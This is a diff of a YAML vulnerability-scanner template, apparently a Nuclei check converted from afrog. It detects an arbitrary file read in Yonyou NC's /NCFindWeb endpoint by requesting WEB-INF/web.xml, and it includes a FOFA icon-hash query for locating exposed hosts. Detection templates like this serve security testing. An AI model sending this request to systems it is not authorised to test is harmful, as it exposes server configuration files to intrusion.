@@ -1,29 +1,32 @@
-# 来源: afrog（转换自 afrog/xray 表达式 POC）
+id: yonyou-ncfindweb-fileread
+
+info:
+  name: 用友 NC NCFindWeb 任意文件读取
+  author: princechaddha
+  severity: high
+  description: |
+    用友 NC /NCFindWeb 可通过 filename 读取 WEB-INF/web.xml（<web-app>）。与已有目录列举模板 erp-nc-directory-traversal 不同，本条校验文件内容。属 NC leftover。
+  reference:
+    - https://github.com/zan8in/afrog
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: icon_hash="1085941792"
+  tags: yonyou,nc,fileread
+
 http:
-  - matchers:
-      - type: status
-        status:
-          - 200
+  - method: GET
+    path:
+      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
       - type: word
         part: body
         words:
-          - <web-app
-          - </web-app>
+          - "<web-app"
+          - "</web-app>"
         condition: and
-    method: GET
-    path:
-      - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'
-id: yonyou-ncfindweb-fileread
-info:
-  author: princechaddha
-  description: |
-    用友 NC NCFindWeb 任意文件读取漏洞
-    fofa: icon_hash="1085941792"
-  metadata:
-    argus-execution-class: detection
-    argus-import-license: MIT License
-    argus-import-source: afrog
-    argus-risk-level: high
-  name: 用友 NC NCFindWeb 任意文件读取漏洞
-  severity: high
-  tags: yonyou,ncfindweb,fileread,argus-import
+      - type: status
+        status:
+          - 200
